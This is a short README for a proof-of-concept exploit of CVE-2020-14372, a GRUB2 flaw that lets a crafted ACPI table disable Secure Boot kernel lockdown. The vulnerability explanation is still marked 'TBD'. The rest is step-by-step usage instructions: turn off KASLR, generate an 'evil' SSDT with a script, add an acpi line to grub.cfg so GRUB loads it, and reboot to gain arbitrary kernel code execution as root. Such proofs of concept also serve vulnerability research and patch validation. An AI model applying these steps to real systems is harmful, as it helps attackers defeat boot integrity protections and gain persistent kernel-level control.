# CVE-2020-14372: Bypassing (not so) Secure Boot with one "simple trick"

## Vulnerability details

TBD: Write-up coming soon

## How to use the PoC

Assumptions:

- The attacker has `root` access to the running operating system
- Linux is booted under UEFI Secure Boot with GRUB2 version <=2.02
  (some builds of 2.02 are patched), this will cause kernel lockdown to be enabled

When the above assumptions are met, edit `/etc/default/grub`, add `nokaslr`
to `GRUB_CMDLINE_LINUX_DEFAULT`, run `update-grub`, and then finally reboot.

After the kernel is booted without address space layout randomization, the
`genssdt.py` script can be used to generate a "malicious" SSDT that will patch
the kernel's memory at runtime to disable lockdown:

```
python3 genssdt.py > /boot/efi/evil_ssdt.aml
```

Now that the SSDT was created, the GRUB configuration file
(usually at `/boot/grub/grub.cfg`) must be edited to make GRUB load this SSDT
(adding this to the top of this file):

```
acpi (hd0,gpt1)/evil_ssdt.aml
```

Based on where the EFI system partition (where we placed the SSDT above) resides
on disk, `(hd0,gpt1)` might need to be replaced with something else.

Finally after a reboot, kernel lockdown should be disabled, giving `root` the
ability to execute arbitrary code in the kernel.
